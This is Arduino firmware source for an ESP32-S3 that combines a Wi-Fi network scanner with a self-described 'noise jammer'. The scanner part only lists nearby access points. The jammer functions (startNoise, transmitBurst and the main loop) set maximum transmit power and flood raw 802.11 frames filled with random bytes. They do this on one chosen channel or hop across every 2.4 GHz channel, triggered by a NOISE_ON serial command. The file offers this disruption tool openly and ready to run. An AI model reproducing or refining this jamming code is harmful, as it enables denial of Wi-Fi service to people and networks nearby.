/**
 * ESP32-S3 Wi-Fi Analyzer + Dual Mode Noise Jammer
 * Version: 1.4.0 - Wideband + Single Channel
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

#define SERIAL_BAUD       115200
#define DEFAULT_INTERVAL  5000
#define MAX_SCAN_RESULTS  30

// Global State
bool     autoScan       = false;
uint32_t scanInterval   = DEFAULT_INTERVAL;
uint32_t lastScan       = 0;
String   cmdBuffer      = "";

bool     noiseMode      = false;
bool     isWideband     = false;
uint8_t  noiseChannel   = 6;
uint32_t lastSerialCheck = 0;
uint32_t lastHopTime    = 0;
uint8_t  currentChannel = 1;

// ================================================================
//                     NOISE FUNCTIONS
// ================================================================

void startNoise(bool wideband, uint8_t ch = 6) {
  if (noiseMode) return;
  
  isWideband = wideband;
  noiseChannel = constrain(ch, 1, 13);
  noiseMode = true;
  
  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);

  if (wideband) {
    Serial.println("{\"type\":\"status\",\"status\":\"wideband_on\",\"mode\":\"full_2.4ghz\"}");
  } else {
    esp_wifi_set_channel(noiseChannel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("{\"type\":\"status\",\"status\":\"noise_on\",\"channel\":%d}\n", noiseChannel);
  }
}

void stopNoise() {
  if (!noiseMode) return;
  noiseMode = false;
  WiFi.mode(WIFI_STA);
  esp_wifi_set_mode(WIFI_MODE_STA);
  Serial.println("{\"type\":\"status\",\"status\":\"noise_off\"}");
}

void transmitBurst() {
  uint8_t packet[64];
  packet[0] = 0x08; packet[1] = 0x00;
  packet[2] = 0x00; packet[3] = 0x00;

  for (int i = 4; i < 64; i += 4) {
    uint32_t rnd = esp_random();
    memcpy(&packet[i], &rnd, 4);
  }

  if (isWideband) {
    currentChannel = (currentChannel % 13) + 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  } else {
    esp_wifi_set_channel(noiseChannel, WIFI_SECOND_CHAN_NONE);
  }

  esp_wifi_80211_tx(WIFI_IF_AP, packet, 64, false);
}

// ================================================================
//                     SCAN + COMMAND CODE (unchanged but included)
// ================================================================

String jsonEscape(const String& s) {
  String out;
  out.reserve(s.length() + 4);
  for (char c : s) {
    if (c == '"') out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c == '\t') out += "\\t";
    else out += c;
  }
  return out;
}

int encCode(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:         return 0;
    case WIFI_AUTH_WEP:          return 1;
    case WIFI_AUTH_WPA_PSK:      return 2;
    case WIFI_AUTH_WPA2_PSK:     return 3;
    case WIFI_AUTH_WPA_WPA2_PSK: return 4;
    case WIFI_AUTH_WPA3_PSK:     return 5;
    default:                     return 3;
  }
}

const char* bandStr(int ch) { return (ch >= 36) ? "5" : "2.4"; }

void performScan() {
  Serial.println("{\"type\":\"status\",\"msg\":\"scanning\"}");
  int n = WiFi.scanNetworks(false, true);
  if (n < 0) {
    Serial.println("{\"type\":\"error\",\"msg\":\"scan_failed\"}");
    return;
  }
  if (n > MAX_SCAN_RESULTS) n = MAX_SCAN_RESULTS;

  String json = "{\"type\":\"scan\",\"ts\":";
  json += String(millis());
  json += ",\"count\":";
  json += String(n);
  json += ",\"aps\":[";

  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    String ssid = WiFi.SSID(i);
    String bssid = WiFi.BSSIDstr(i);
    int rssi = WiFi.RSSI(i);
    int ch = WiFi.channel(i);
    int enc = encCode(WiFi.encryptionType(i));

    json += "{\"ssid\":\"";
    json += jsonEscape(ssid);
    json += "\",\"bssid\":\"";
    json += bssid;
    json += "\",\"ch\":";
    json += String(ch);
    json += ",\"rssi\":";
    json += String(rssi);
    json += ",\"enc\":";
    json += String(enc);
    json += ",\"band\":\"";
    json += bandStr(ch);
    json += "\"}";
  }
  json += "]}";
  Serial.println(json);
  WiFi.scanDelete();
}

void handleCommand(String cmd) {
  cmd.trim();
  String c = cmd;
  c.toUpperCase();

  if (c.startsWith("NOISE_ON")) {
    String p = cmd.substring(9);
    p.trim();
    if (p.length() == 0) {
      startNoise(true);                    // No param = Wideband
    } else {
      uint8_t ch = (uint8_t)p.toInt();
      startNoise(false, ch);
    }
  }
  else if (c == "NOISE_OFF") stopNoise();
  else if (c == "SCAN") performScan();
  else if (c == "AUTO_ON") { autoScan = true; Serial.println("{\"type\":\"status\",\"msg\":\"auto_on\"}"); }
  else if (c == "AUTO_OFF") { autoScan = false; Serial.println("{\"type\":\"status\",\"msg\":\"auto_off\"}"); }
  else if (c.startsWith("INTERVAL ")) {
    int val = c.substring(9).toInt();
    if (val >= 1 && val <= 300) scanInterval = (uint32_t)val * 1000;
  }
  else if (c == "INFO") {
    Serial.printf("{\"type\":\"info\",\"fw\":\"1.4.0-dual\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n", ESP.getFreeHeap());
  }
}

// ================================================================
//                     SETUP + LOOP
// ================================================================

void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(800);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  Serial.println("{\"type\":\"ready\",\"fw\":\"1.4.0-dual\",\"chip\":\"ESP32-S3\"}");
}

void loop() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (cmdBuffer.length() > 0) {
        handleCommand(cmdBuffer);
        cmdBuffer = "";
      }
    } else cmdBuffer += c;
  }

  if (autoScan && !noiseMode) {
    uint32_t now = millis();
    if (now - lastScan >= scanInterval) {
      lastScan = now;
      performScan();
    }
  }

  if (noiseMode) {
    transmitBurst();
    if (millis() - lastSerialCheck >= 50) {
      lastSerialCheck = millis();
      delay(2);
    } else {
      delayMicroseconds(10);
    }
  }
}